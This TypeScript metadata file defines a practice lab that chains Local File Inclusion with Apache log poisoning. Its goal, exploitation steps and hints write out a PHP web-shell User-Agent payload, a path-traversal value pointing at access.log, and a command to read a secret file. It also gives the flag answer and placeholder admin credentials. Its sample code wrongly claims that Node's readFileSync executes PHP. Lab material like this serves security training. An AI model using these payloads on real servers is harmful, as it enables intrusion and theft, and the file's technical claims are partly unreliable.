// src/modules/practice-labs/file-inclusion/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lfiLab3Metadata: LabMetadata = {
  slug: 'lfi-log-poisoning-apache-rce',
  title: 'File Inclusion: LFI to Log Poisoning — Apache Access Log RCE',
  ar_title: 'تضمين الملفات: LFI إلى تسميم السجلات — RCE عبر Apache Access Log',
  description:
    'Chain a Local File Inclusion vulnerability with Apache log poisoning to achieve Remote Code Execution. First poison the Apache access log by injecting PHP code into the User-Agent header, then use LFI to include the poisoned log file — triggering execution of the injected PHP code.',
  ar_description:
    'سلسل ثغرة LFI مع تسميم سجلات Apache لتحقيق RCE. أولاً سمّم سجل Apache access.log بحقن كود PHP في User-Agent header، ثم استخدم LFI لتضمين ملف السجل المسموم — مما يُطلق تنفيذ كود PHP المحقون.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'LFI to RCE',
    'Log Poisoning',
    'PHP Code Injection',
    'Apache Log Abuse',
    'Chained Exploitation',
  ],
  xpReward: 300,
  pointsReward: 150,
  duration: 55,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  goal: 'Step 1: Send a request with User-Agent: "<?php system($_GET[\'cmd\']); ?>" to poison the access log. Step 2: Use LFI to include /var/log/apache2/access.log with cmd=cat /var/www/html/secret.txt to execute the injected PHP and read the flag.',
  scenario: {
    context:
      'ViewerX web app has LFI via the "page" parameter. The Apache server logs all requests including User-Agent to /var/log/apache2/access.log. By sending a request with PHP code in the User-Agent, the PHP code gets written into the log file. When the LFI includes this log file, Apache/PHP executes the injected code — achieving RCE.',
    vulnerableCode: `// Step 1: Poison the log
// Request with: User-Agent: <?php system($_GET['cmd']); ?>
// Apache writes to access.log:
// 192.168.1.1 - - [date] "GET / HTTP/1.1" 200 - "<?php system($_GET['cmd']); ?>"

// Step 2: Trigger LFI with the poisoned log
app.get('/view', isAuthenticated, (req, res) => {
  const page = req.query.page;
  // ❌ LFI — includes the log file which contains injected PHP!
  const content = fs.readFileSync('/var/www/html/pages/' + page);
  res.send(content); // PHP gets executed
});`,
    exploitation:
      '1. POST /log/poison with { "userAgent": "<?php system($cmd); ?>" } to write PHP into access.log\n2. POST /page/view with { "page": "../../../../var/log/apache2/access.log", "cmd": "cat /var/www/html/secret.txt" }',
  },
  hints: [
    {
      order: 1,
      xpCost: 20,
      content:
        'Apache logs every request including the User-Agent header. If you put PHP code in User-Agent, it gets written to access.log as plain text.',
    },
    {
      order: 2,
      xpCost: 40,
      content:
        'Use /log/poison to inject PHP into the access log User-Agent. Then use LFI to include the log file — the server will execute the PHP code in the log.',
    },
    {
      order: 3,
      xpCost: 65,
      content:
        'Step 1: POST /log/poison with { "userAgent": "<?php system($cmd); ?>" }\nStep 2: POST /page/view with { "page": "../../../../var/log/apache2/access.log", "cmd": "cat /var/www/html/secret.txt" }',
    },
    {
      order: 4,
      xpCost: 90,
      content:
        'After poisoning the log, use LFI on the log file with cmd parameter. The PHP in the log will execute and return the secret.txt contents including the flag.',
    },
  ],
  flagAnswer: 'FLAG{LFI_LOG_POISONING_APACHE_RCE_PHP_INJECTION}',
  initialState: {
    contents: [
      {
        title: 'SECRET_TXT',
        body: 'Server Admin Credentials\n========================\nAdmin Panel: https://viewerx-admin.io/panel\nUsername: admin@viewerx.io\nPassword: V13w3rX_ADM1N_2024!\n\nFLAG: FLAG{LFI_LOG_POISONING_APACHE_RCE_PHP_INJECTION}',
        author: 'system_file',
        isPublic: false,
      },
      {
        title: 'ACCESS_LOG_INITIAL',
        body: '192.168.1.100 - - [05/Mar/2026:20:00:01 +0000] "GET / HTTP/1.1" 200 2326 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"\n192.168.1.101 - - [05/Mar/2026:20:01:15 +0000] "GET /about HTTP/1.1" 200 1024 "Mozilla/5.0 (X11; Linux x86_64)"\n192.168.1.102 - - [05/Mar/2026:20:02:33 +0000] "POST /login HTTP/1.1" 302 - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
        author: 'apache_log',
        isPublic: false,
      },
    ],
  },
};
